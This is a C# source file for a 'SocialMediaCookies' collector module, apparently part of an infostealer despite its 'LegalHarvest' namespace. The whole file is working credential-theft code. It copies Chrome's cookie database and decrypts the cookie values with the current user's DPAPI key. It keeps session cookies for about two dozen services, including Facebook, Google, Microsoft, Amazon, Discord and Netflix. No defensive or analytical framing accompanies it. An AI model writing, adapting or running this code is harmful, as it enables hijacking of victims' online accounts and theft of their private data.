using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace LegalHarvest.Modules
{
    public class SocialMediaCookiesModule : ICollectorModule
    {
        public string ModuleName => "SocialMediaCookies";

        private readonly List<string> targetDomains = new List<string>
        {
            "facebook.com", "instagram.com", "twitter.com", "x.com",
            "linkedin.com", "tiktok.com", "reddit.com", "github.com",
            "google.com", "youtube.com", "microsoft.com", "live.com",
            "amazon.com", "ebay.com", "dropbox.com", "discord.com",
            "telegram.org", "whatsapp.com", "snapchat.com", "pinterest.com",
            "twitch.tv", "spotify.com", "netflix.com"
        };

        public bool CanExecute()
        {
            string cookieDb = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                         @"Google\Chrome\User Data\Default\Cookies");
            return File.Exists(cookieDb);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string cookieDb = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                         @"Google\Chrome\User Data\Default\Cookies");
            string tempDb = Path.GetTempFileName();
            File.Copy(cookieDb, tempDb, true);

            try
            {
                using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                {
                    conn.Open();
                    string query = "SELECT host_key, name, encrypted_value FROM cookies";
                    using (var cmd = new SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string host = reader["host_key"].ToString().TrimStart('.');
                            bool match = targetDomains.Exists(d => host.EndsWith(d, StringComparison.OrdinalIgnoreCase));
                            if (!match) continue;

                            string name = reader["name"].ToString();
                            byte[] encryptedValue = (byte[])reader["encrypted_value"];
                            string value = "";
                            try
                            {
                                byte[] decrypted = ProtectedData.Unprotect(encryptedValue, null, DataProtectionScope.CurrentUser);
                                value = Encoding.UTF8.GetString(decrypted);
                            }
                            catch { value = "[DECRYPT_FAILED]"; }

                            items.Add(new CollectedItem { Category = "SocialMediaCookie", Name = host, Value = $"{name}={value}", Timestamp = DateTime.Now });
                        }
                    }
                }
            }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
            return items;
        }
    }
}
